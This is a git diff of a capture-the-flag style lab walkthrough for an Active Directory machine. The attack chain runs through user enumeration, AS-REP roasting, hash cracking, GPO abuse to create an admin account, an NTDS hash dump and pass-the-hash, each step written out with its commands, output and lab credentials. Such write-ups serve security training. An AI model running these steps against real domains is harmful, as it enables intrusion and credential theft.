@@ -4,6 +4,7 @@ date: 2025-10-31 00:00:00 +0800
 categories: [Hack Smarter Lab]
 tags: [username-anarchy, remmina, gpo-abuse, asreproasting, kerbrute, active-directory, privilege-escalation]
 difficulty: medium
+author: 0xmr
 platform: Hack Smarter
 image: /assets/img/posts/sysco-lab.png
 excerpt: "A comprehensive walkthrough of the SYSCO lab on Hack Smarter, covering GPO abuse, ASREPRoasting, and privilege escalation techniques."
@@ -19,7 +20,7 @@ The core objective of this external penetration test is to simulate a realistic,
 
 ### Scanning
 rustscan -a $target -- -A
-```language
+```bash
 PORT      STATE SERVICE       REASON          VERSION
 53/tcp    open  domain        syn-ack ttl 126 Simple DNS Plus
 80/tcp    open  http          syn-ack ttl 126 Apache httpd 2.4.58 ((Win64) OpenSSL/3.1.3 PHP/8.2.12)
@@ -52,13 +53,13 @@ PORT      STATE SERVICE       REASON          VERSION
 ### Http Enumeration Port 80
 The website leaks the potential user worked in the Comapany so we use the tool called ***username-anarchy*** . This tool will help you get the combination of user list.
 Save the usernames in the users.txt
-```language
+```bash
 ./username-anarchy -i users.txt  > valid-user.lst 
 ```
 
 ### Kerbrute
 This tool will help us to find the valid user in the domain and also it will do a AS-Reproasting .
-```language
+```bash
 kerbrute userenum -d SYSCO.LOCAL --dc $target valid-user.lst 
 
     __             __               __     
@@ -80,18 +81,18 @@ $krb5asrep$18$jack.dowland@SYSCO.LOCAL:fc0fa99a1a1e18d3c10f3a404d5217c7$f8a71edb
 2025/10/31 16:29:40 >  Done! Tested 58 usernames (3 valid) in 6.422 seconds
 ```
 ### Crack the Hash Using hashcat
-```markdown
+```bash
 $krb5asrep$18$jack.dowland@SYSCO.LOCAL:fc0fa99a1a1e18d3c10f3a404d5217c7$f8a71edb135b8f43875b06923ff4c7166cf3b2d95ca7b7e781b275e076dc1541a0a1f1eeeb2302911b80f3b31bcd9e9ed5fcfaf98c31c64443bbfcc3f38521960d5ad30a5f5a69434dc63bdd0cbdf5baa12e11f07e88c52590b23e5ffe3ef3933d0c52469b5fcad47ef945c9b73ed39a5938d2e5a18852357e00efda6801677e4866027cf6ed0970f343a8cea5889fe7dc0c96f9d1cac0f1ad99cb603b84cd55ec30c68452c7ec76e625f52dc43a76e00f27013dbdbba3faad8746297edfa2c2de3da5191a782405b86d77a59e02582865cd3c0da4cc93ba6ac96f03eaaad1f191e7e8c305a794aeba7e793c09b8e91384e6f86e3ab71c1ccb4c49393b97:`musicman1`
 ```
 Validate the Creds
-```language                                                                                                                                                                                             
+```bash                                                                                                                                                                                             
 ┌──(root㉿kali)-[/home/ivy/Downloads/hack-smarter]
 └─# NetExec smb $target -u jack.dowland -p 'musicman1' 
 SMB         10.1.99.194     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SYSCO.LOCAL) (signing:True) (SMBv1:False) 
 SMB         10.1.99.194     445    DC01             [+] SYSCO.LOCAL\jack.dowland:musicman1 
 ```
 ### Directory Fuzzing using Dirsearch
-```lamguage
+```bash
 └─# dirsearch -u http://sysco.local -r -x 400,403
   _|. _ _  _  _  _ _|_    v0.4.3                                                                                                                                                             
  (_||| _) (/_(_|| (_| )                                                                                                                                                                   
@@ -125,7 +126,7 @@ Added to the queue: forms/
 
 ### Download the config file
 Crack the hash using the hashcat ---> Chocolate1
-```language
+```bash
 cat router2.cfg 
 
 version 15.1
@@ -136,10 +137,10 @@ hostname R2
 enable secret 5 $1$mERr$isugnYiHsjHT.i.tc2GDY.
 <snip>
 ```
-```language
+```bash
 hashcat -m 500 client.hash /usr/share/wordlists/rockyou.txt
 ```
-```language
+```bash
 └─# NetExec smb $target -u lainey.moore -p 'Chocolate1'                                                  
 SMB         10.1.99.194     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SYSCO.LOCAL) (signing:True) (SMBv1:False) 
 SMB         10.1.99.194     445    DC01             [+] SYSCO.LOCAL\lainey.moore:Chocolate1 
@@ -151,24 +152,24 @@ After run the putty we found the credentials in the target field. So we spray th
 # GPO Abuse 
 
 ### evil-winrm it
-```language
+```bash
 evil-winrm -i $target -u 'greg.shields' -p'5y5coSmarter2025!!!'
 ```
 ### Grab the GPO id 
-```language
+```bash
 # Grab the Domain admin GPO ID from there
 Get-GPO -All
 ```
 ### pygpoabuse.py
 By Default it create a user:- John  and Password:- H4x00r123..
-```language
+```bash
 └─# python3 pygpoabuse.py sysco.local/greg.shields -gpo-id '31B2F340-016D-11D2-945F-00C04FB984F9'
 Password:
 success:root:The GPO already includes a ScheduledTasks.xml.
 [+] The GPO heduledTasks.xml.
 ```
 This tool will create a ScheduledTasks , that contain the user detail and add the user to the lcoal admin group .
-```langauge
+```bash
 # Run this commands to make changes in the machine
 gpudate /all
 
@@ -177,7 +178,7 @@ net user john
 ```
 ### DCsync
 So we are know the domain admin , we can dump every think. let's dump all user hashes.
-```language
+```bash
 └─# NetExec smb 10.1.99.194 -u John -p 'H4x00r123..' --ntds
 [!] Dumping the ntds can crash the DC on Windows Server 2019. Use the option --user <user> to dump a specific user safely or the module -M ntdsutil [Y/n] y
 SMB         10.1.99.194     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SYSCO.LOCAL) (signing:True) (SMBv1:False) 
@@ -194,6 +195,6 @@ SMB         10.1.99.194     445    DC01             DC01$:1000:aad3b435b51404eea
 ```
 ## Root Flag
 Grab the Root flag
-```language
+```bash
 evil-winrm -i $target -u 'Administrator' -H $hash
 ```
